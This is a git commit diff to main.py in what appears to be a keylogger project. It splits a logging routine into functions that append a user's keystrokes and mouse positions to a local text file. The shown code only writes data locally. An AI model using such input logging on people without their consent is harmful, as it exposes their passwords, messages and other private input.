a4ea59ca2b6a017769abf2f5813ce2b94e3685ac
DeadPixelz01 <deadpixelz01@gmail.com>
2019-01-03 17:44:33 -0600

    Split the append functions due to the different type of data being collected

--- main.py
+++ main.py
@@ -5,12 +5,27 @@
 
 file_name = 'usr_log.txt'
 
-
 # creates and writes to a local text file called 'usr_log'
-def append_to_log(keystrokes):
-    keystroke_data = str(keystrokes)
+# this is split into 2 functions for now ('mouse_append_to_log' and 'key_append_to_log')
+
+
+# appends the user's mouse position to a local text file
+def mouse_append_to_log(x, y):
+    # formats mouse data into a more readable string
+    mouse_data = 'The current mouse position is {0}'.format((x, y))
+    # opens text file in append mode
     with open(file_name, 'a') as file_a:
-        # writes string to file
+        # appends mouse data to the text file
+        file_a.write(mouse_data)
+
+
+# appends the user's keystrokes to a local text file
+def key_append_to_log(keystrokes):
+    # formats keystrokes into a more readable string
+    keystroke_data = str(keystrokes)
+    # opens text file in append mode
+    with open(file_name, 'a') as file_a:
+        # appends keystrokes to the text file
         file_a.write(keystroke_data)
 
 
